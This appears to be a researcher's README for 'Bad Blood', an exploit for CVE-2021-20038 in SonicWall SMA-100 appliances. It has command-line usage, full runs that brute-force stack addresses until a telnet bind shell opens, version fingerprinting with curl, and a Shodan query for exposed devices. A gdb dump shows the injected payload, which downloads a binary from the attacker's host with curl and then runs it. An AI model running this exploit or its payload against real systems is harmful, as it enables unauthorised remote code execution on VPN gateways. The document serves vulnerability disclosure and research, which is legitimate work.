# Bad Blood

Bad Blood is an exploit for [CVE-2021-20038](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20038), a stack-based buffer overflow in the `httpd` binary of SMA-100 series systems using firmware versions 10.2.1.x. I've written a lot of the technical details here:

* [AttackerKB CVE-2021-20038](https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis)

The exploit, as written, will open up a telnet bind shell on port 1270. An attacker that connects to the shell will achieve execution as `nobody`.

## Example Output

```
albinolobster@ubuntu:~/badblood$ date
Mon Jan 10 01:15:12 PM PST 2022
albinolobster@ubuntu:~/badblood$ python3 badblood.py --rhost 10.0.0.7 --lhost 10.0.0.3 --rversion 10.2.1.2-24sv

▄▄▄▄    ▄▄▄      ▓█████▄     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄     
▓█████▄ ▒████▄    ▒██▀ ██▌   ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌  
▒██▒ ▄██▒██  ▀█▄  ░██   █▌   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌   ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ 
░▓█  ▀█▓ ▓█   ▓██▒░▒████▓    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  
 ░    ░   ░   ▒    ░ ░  ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  
 ░            ░  ░   ░        ░          ░  ░    ░ ░      ░ ░     ░     
      ░            ░               ░                            ░       

[+] Spinning up HTTP server
[+] User did not provide an address. We'll guess it.
[+] Generated 2047 base addresses
[+] Generated 1046017 total addresses to search
[+] Filtering addresses for double visits (thanks awesome payload!)
[+] Filtered down to 235533 total addresses to search
[+] Crashing all forks to reset stack to a semi-predicatable state
[+] Crashing complete. Good job. Let's go do work.
[+] Disabling stderr
[+] Spawning 4 workers
[+] Attempting to exploit the remote server. This might take quite some time. :eek:
[%] Addresses Tested: 70%
[*] Received an HTTP callback from 10.0.0.7 at 10/Jan/2022 14:38:03
[*] Now we got bad blood. Hey! 🦞
albinolobster@ubuntu:~/badblood$ telnet 10.0.0.7 1270
Trying 10.0.0.7...
Connected to 10.0.0.7.
Escape character is '^]'.

bash-4.2$ whoami
nobody
bash-4.2$ uname -a
Linux sslvpn 3.13.3 #1 SMP Tue Oct 12 09:52:15 GMT 2021 i686 i686 i386 GNU/Linux
bash-4.2$ 
```

## Supported Versions

| Version | Supported | Tested | Tested Target |
| - | - | - | - |
| 10.2.1.2-24sv | Yes | :heavy_check_mark: | SMA 500v ESX |
| 10.2.1.1-19sv | Yes | :heavy_check_mark: | SMA 500v ESX |
| 10.2.1.0-17sv | Yes | :heavy_check_mark: | SMA 500v ESX |

## Usage

At minimum, you'll need to provide:

* rhost: the remote host's IP address
* lhost: the local host's IP address
* version: the version of the target.

Please read the stability notes for addtional context. 

An obvious question, is how to obtain the target's version?  A simple `curl` request to the target will reveal that they use the version number for `css` and `js` versioning.

```
albinolobster@ubuntu:~$ curl --insecure https://10.0.0.7/cgi-bin/welcome
...
<link href='/swl_login.10.2.1.2-24sv.css' type='text/css' rel='stylesheet'>
<link href='/swl_header.10.2.1.2-24sv.css' type='text/css' rel='stylesheet'>
<link href='/sma_content_overrides.10.2.1.2-24sv.css' type='text/css' rel='stylesheet'>
<link href='/sma_login_overrides.10.2.1.2-24sv.css' type='text/css' rel='stylesheet'>
<link href="/notificationbar.10.2.1.2-24sv.css" type="text/css" rel="stylesheet">
<script src="/js/jquery.10.2.1.2-24sv.js" type="text/javascript" charset="utf-8"></script>
```

The Metasploit module for CVE-2021-20039 parses this, but I didn't have it in me to do it for this exploit. Note that if you are scanning your environment for these things, I believe the ["Server: SonicWall SSL-VPN Web Server"](https://www.shodan.io/search?query=%22Server%3A+SonicWALL+SSL-VPN+Web+Server%22) is the most reliable. About 22k in Jan. 2022.

### Help Output
```
albinolobster@ubuntu:~/badblood$ python3 badblood.py --help

▄▄▄▄    ▄▄▄      ▓█████▄     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄     
▓█████▄ ▒████▄    ▒██▀ ██▌   ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌  
▒██▒ ▄██▒██  ▀█▄  ░██   █▌   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌   ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ 
░▓█  ▀█▓ ▓█   ▓██▒░▒████▓    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  
 ░    ░   ░   ▒    ░ ░  ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  
 ░            ░  ░   ░        ░          ░  ░    ░ ░      ░ ░     ░     
      ░            ░               ░                            ░       

usage: badblood.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST [--rversion RVERSION] [--rhostname RHOSTNAME] [--supported-versions] [--workers WORKERS] [--nocrash] [--enable-stderr] [--addr ADDR]
                   [--top-addr TOP_ADDR]

SonicWall SMA-100 Series Stack-Buffer Overflow Exploit (CVE-2021-20038)

optional arguments:
  -h, --help            show this help message and exit
  --supported-versions  The list of supported SMA-100 versions
  --workers WORKERS     The number of workers to spew the exploit
  --nocrash             Stops the exploit from sending a series of crash payload to start
  --enable-stderr       Enable stderr for debugging
  --addr ADDR           Test only. If you know the crash address, go wild.
  --top-addr TOP_ADDR   Test only. If you know the stack's top address, go wild.

required arguments:
  --rhost RHOST         The IPv4 address to connect to
  --rport RPORT         The port to connect to
  --lhost LHOST         The address to connect back to
  --rversion RVERSION   The version of the remote target
  --rhostname RHOSTNAME
                        The hostname of the remote target target
```

### --addr vs. --top-addr vs. no option

There are three main modes of operation. The first is the exptected mode (address guessing). The second two are mostly for testing purposes.

#### I don't know any addresses!

This is the default state and no problem! We'll just guess a lot.

#### I know the address of the top of the stack!

Great! If you can cat maps or do some other magic:

```
bfa29000-bfa4a000 rw-p 00000000 00:00 0          [stack]
```

You can use the --top_addr parameter and reduce attack time down to a few seconds!

```
albinolobster@ubuntu:~/badblood$ date
Mon Jan 10 05:42:19 PM PST 2022
albinolobster@ubuntu:~/badblood$ python3 badblood.py --rhost 10.0.0.7 --lhost 10.0.0.3 --rversion 10.2.1.2-24sv --top-addr 3215237120

▄▄▄▄    ▄▄▄      ▓█████▄     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄     
▓█████▄ ▒████▄    ▒██▀ ██▌   ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌  
▒██▒ ▄██▒██  ▀█▄  ░██   █▌   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌   ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ 
░▓█  ▀█▓ ▓█   ▓██▒░▒████▓    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  
 ░    ░   ░   ▒    ░ ░  ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  
 ░            ░  ░   ░        ░          ░  ░    ░ ░      ░ ░     ░     
      ░            ░               ░                            ░       

[+] Spinning up HTTP server
[+] User provided the top stack address: bfa4a000
[+] Generated 511 total addresses to search
[+] Filtering addresses for double visits (thanks awesome payload!)
[+] Filtered down to 243 total addresses to search
[+] Crashing all forks to reset stack to a semi-predicatable state
[+] Crashing complete. Good job. Let's go do work.
[+] Disabling stderr
[+] Spawning 4 workers
[+] Attempting to exploit the remote server. This might take quite some time. :eek:
[%] Addresses Tested: 33%
[*] Received an HTTP callback from 10.0.0.7 at 10/Jan/2022 17:42:34
[*] Now we got bad blood. Hey! 🦞
albinolobster@ubuntu:~/badblood$ telnet 10.0.0.7 1270
Trying 10.0.0.7...
Connected to 10.0.0.7.
Escape character is '^]'.

bash-4.2$ whoami
nobody
bash-4.2$ 
```

#### I know the exact address of $ebp+8

My man. Use --addr.

```
albinolobster@ubuntu:~/badblood$ date
Mon Jan 10 05:48:58 PM PST 2022
albinolobster@ubuntu:~/badblood$ python3 badblood.py --rhost 10.0.0.7 --lhost 10.0.0.3 --rversion 10.2.1.2-24sv --addr 3215229520

▄▄▄▄    ▄▄▄      ▓█████▄     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄     
▓█████▄ ▒████▄    ▒██▀ ██▌   ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌  
▒██▒ ▄██▒██  ▀█▄  ░██   █▌   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌   ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ 
░▓█  ▀█▓ ▓█   ▓██▒░▒████▓    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  
 ░    ░   ░   ▒    ░ ░  ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  
 ░            ░  ░   ░        ░          ░  ░    ░ ░      ░ ░     ░     
      ░            ░               ░                            ░       

[+] Spinning up HTTP server
[+] User provided the crash address: bfa48250
[+] Filtering addresses for double visits (thanks awesome payload!)
[+] Filtered down to 1 total addresses to search
[+] Crashing all forks to reset stack to a semi-predicatable state
[+] Crashing complete. Good job. Let's go do work.
[+] Disabling stderr
[+] Spawning 4 workers
[+] Attempting to exploit the remote server. This might take quite some time. :eek:

[*] Received an HTTP callback from 10.0.0.7 at 10/Jan/2022 17:49:08
[*] Now we got bad blood. Hey! 🦞
albinolobster@ubuntu:~/badblood$ telnet 10.0.0.7 1270
Trying 10.0.0.7...
Connected to 10.0.0.7.
Escape character is '^]'.

bash-4.2$ whoami
nobody
bash-4.2$ uname -a
Linux sslvpn 3.13.3 #1 SMP Tue Oct 12 09:52:15 GMT 2021 i686 i686 i386 GNU/Linux
bash-4.2$ 
```

## Stability

A good question for any exploit: How stable is this exploit? Not at all :lol: The buffer overflow occurs in a library called `mod_cgi.so` (a modified version of the Apache HTTP project). The library is loaded with a randomized base and the overflow requires a *very specific* memory layout to be successful (at least as I read it). Really not great for a remote attacker. But as I detailed in the [AttackerKB](https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis) entry, there is a variety of things that allow us to *guess* the random address we desire.

As such, this exploit, as written (I cannot emphasize enough that this can be improved), sends up to 235,335 HTTP requests in order to land the payload by guessing a stack address. Two hundred thousand requests doesn't sound bad but it can take some time. In the example I posted above, the exploit took 83 minutes to land. Which means you aren't rolling it into your Mirai botnet to spew all over the internet :shrug: I think it *is* a reasonable exploit for a targeted attack though.

Additionally, the exploit (as implemented) suffers from two issues that could cause exploitation to fail. The first one is sort of silly. There are two addresses in front of the shell command that eventually gets executed. Both those addresses get passed to `/bin/sh` because programming is hard. If the first address has a shell metacharacter like '(' or '`' then the exploit simply won't ever work. Sorry! The worst part is that you'll never really know if the remote target requires such an address or if the exploit is broken!

The second issue is much more specific to how I wrote this, and could easily be fixed by someone that cares. I wrote this exploit to make a call to system, because I'm lazy and a hack. That required the payload to remain less than 2500ish bytes otherwise you end up overwriting env[] and crashing failing. Anyways. As mentioned in the AKB entry, the overflow occurs due to the build up of an environment string build up. Alignment and whatnot are very important to this exploit. Here is an example of the payload in memory:

```
Breakpoint 1, 0xb697cfe6 in ?? () from /lib/mod_cgi.so
(gdb) disas 0xb697cfe6,0xb697cfea
Dump of assembler code from 0xb697cfe6 to 0xb697cfea:
=> 0xb697cfe6:  mov    0x8(%ebp),%eax
   0xb697cfe9:  mov    0x110(%eax),%eax
End of assembler dump.
(gdb) printf "%s", $ebp-982      
10.0.0.3 REDIRECT_QUERY_STRING=zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz REDIRECT_WAF_NOT_LICENSED=1REDIRECT_SCRIPT_URL=/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaREDIRECT_SCRIPT_URI=https://sslvpn/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaREDIRECT_HTTPS=onREDIRECT_REQUEST_METHOD=GETREDIRECT_STATUS=404WAF_NOT_LICENSED=1SCRIPT_URL=/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaSCRIPT_URI=https://sslvpn/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaHTTPS=onSERVER_SIGNATURE=SERVER_SOFTWARE=SonicWALL SSL-VPN Web ServerSERVER_NAME=sslvpnSERVER_ADDR=10.0.0.7SERVER_PORT=443REMOTE_ADDR=10.0.0.3DOCUMENT_ROOT=/usr/src/EasyAccess/www/htdocsREQUEST_SCHEME=httpsCONTEXT_PREFIX=CONTEXT_DOCUMENT_ROOT=/usr/src/EasyAccess/www/htdocsSERVER_ADMIN=root@sslvpnSCRIPT_FILENAME=/usr/src/EasyAccess/www/cgi-bin/staticContentREMOTE_PORT=38236REDIRECT_URL=/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaGATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/0.9REQUEST_METHOD=GETREQUEST_URI=/%24%87%a4%bf%38%88%a4%bf%38%88%a4%bf%08%b7%06%08;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa%24%87%a4%bf%38%88%a4%bf%38%88%a4%bf%08%b7%06%08;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa?zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzSCRIPT_NAME=/missing.html
```

And here is where it lands:

```
(gdb) printf "%s", $ebp+8        
$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaSCRIPT_URI=https://sslvpn/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaHTTPS=onSERVER_SIGNATURE=SERVER_SOFTWARE=SonicWALL SSL-VPN Web ServerSERVER_NAME=sslvpnSERVER_ADDR=10.0.0.7SERVER_PORT=443REMOTE_ADDR=10.0.0.3DOCUMENT_ROOT=/usr/src/EasyAccess/www/htdocsREQUEST_SCHEME=httpsCONTEXT_PREFIX=CONTEXT_DOCUMENT_ROOT=/usr/src/EasyAccess/www/htdocsSERVER_ADMIN=root@sslvpnSCRIPT_FILENAME=/usr/src/EasyAccess/www/cgi-bin/staticContentREMOTE_PORT=38236REDIRECT_URL=/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaaGATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/0.9REQUEST_METHOD=GETREQUEST_URI=/%24%87%a4%bf%38%88%a4%bf%38%88%a4%bf%08%b7%06%08;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa%24%87%a4%bf%38%88%a4%bf%38%88%a4%bf%08%b7%06%08;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa?zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzSCRIPT_NAME=/missing.html
(gdb) x/4x $ebp+8
0xbfa48250:     0xbfa48724      0xbfa48838      0xbfa48838      0x0806b708
(gdb) 
```

Any unknown value between the beginning of the payload and the end *will* mess up alignment. Let's break it down a bit better:

```
10.0.0.3
REDIRECT_QUERY_STRING=zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz 
REDIRECT_WAF_NOT_LICENSED=1
REDIRECT_SCRIPT_URL=/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa
REDIRECT_SCRIPT_URI=https://sslvpn/$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa$���8���8��;{curl,10.0.0.3:1270,-o,/tmp/a};{chmod,+x,/tmp/a};/tmp/a;aaaaaaa
REDIRECT_HTTPS=on
REDIRECT_REQUEST_METHOD=GET
REDIRECT_STATUS=404
WAF_NOT_LICENSED=1
SCRIPT_URL=/
```

The obvious issues are:

* IP address at the beginning
* Hostname (`sslvpn` in the example)

Both are easily accounted for simply by modifying query string (z*400+). However, discovering the actual hostname (sslvpn is just the default) and the attacker's IP as it appears here might not always be as trivial. I'm actually not sure of the best way to determine the hostname... but just to prove non-default works:

```
albinolobster@ubuntu:~/badblood$ python3 badblood.py --rhost 10.0.0.7 --lhost 10.0.0.3 --rversion 10.2.1.2-24sv --top-addr 3218436096 --rhostname sslvpn1

▄▄▄▄    ▄▄▄      ▓█████▄     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄     
▓█████▄ ▒████▄    ▒██▀ ██▌   ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌  
▒██▒ ▄██▒██  ▀█▄  ░██   █▌   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌   ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ 
░▓█  ▀█▓ ▓█   ▓██▒░▒████▓    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  
 ░    ░   ░   ▒    ░ ░  ░     ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  
 ░            ░  ░   ░        ░          ░  ░    ░ ░      ░ ░     ░     
      ░            ░               ░                            ░       

[+] Spinning up HTTP server
[+] User provided the top stack address: bfd57000
[+] Generated 511 total addresses to search
[+] Filtering addresses for double visits (thanks awesome payload!)
[+] Filtered down to 243 total addresses to search
[+] Crashing all forks to reset stack to a semi-predicatable state
[+] Crashing complete. Good job. Let's go do work.
[+] Disabling stderr
[+] Spawning 4 workers
[+] Attempting to exploit the remote server. This might take quite some time. :eek:
[%] Addresses Tested: 9%
[*] Received an HTTP callback from 10.0.0.7 at 10/Jan/2022 18:31:45
[*] Now we got bad blood. Hey! 🦞
albinolobster@ubuntu:~/badblood$ telnet 10.0.0.7 1270
Trying 10.0.0.7...
Connected to 10.0.0.7.
Escape character is '^]'.

bash-4.2$ uname -a
Linux sslvpn1 3.13.3 #1 SMP Tue Oct 12 09:52:15 GMT 2021 i686 i686 i386 GNU/Linux
bash-4.2$ 
```

## Testing

Do you want to hack on this? Great! I highly recommend rooting the device using the [CVE-2021-20039](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20039) Metasploit module. Drop busybox on the device and start a root telnet shell. Drop gdb on the device and start debugging.


## Credit

* Taylor Swift